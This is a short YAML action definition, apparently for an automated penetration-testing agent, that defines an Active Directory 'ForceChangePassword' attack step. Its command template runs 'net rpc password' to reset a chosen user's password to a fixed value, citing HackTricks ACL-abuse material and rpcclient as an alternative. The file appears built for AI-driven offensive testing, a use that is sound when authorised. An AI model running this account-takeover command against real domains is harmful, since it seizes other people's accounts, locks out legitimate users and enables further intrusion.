name: forcechangepassword
category: ad
description: Force password change on AD user
preconditions:
- domain_joined
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: net rpc password '{target_user}' 'NewP@ss123!' -U '{domain}/{username}%{password}'
  -S {target_ip}
parser: null
expected_effects:
- action_completed
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: 'Changes target user password. Requires ForceChangePassword right. Alternative:
  rpcclient setuserinfo2.'
hacktricks_ref: windows-hardening/active-directory-methodology/acl-persistence-abuse/README.md
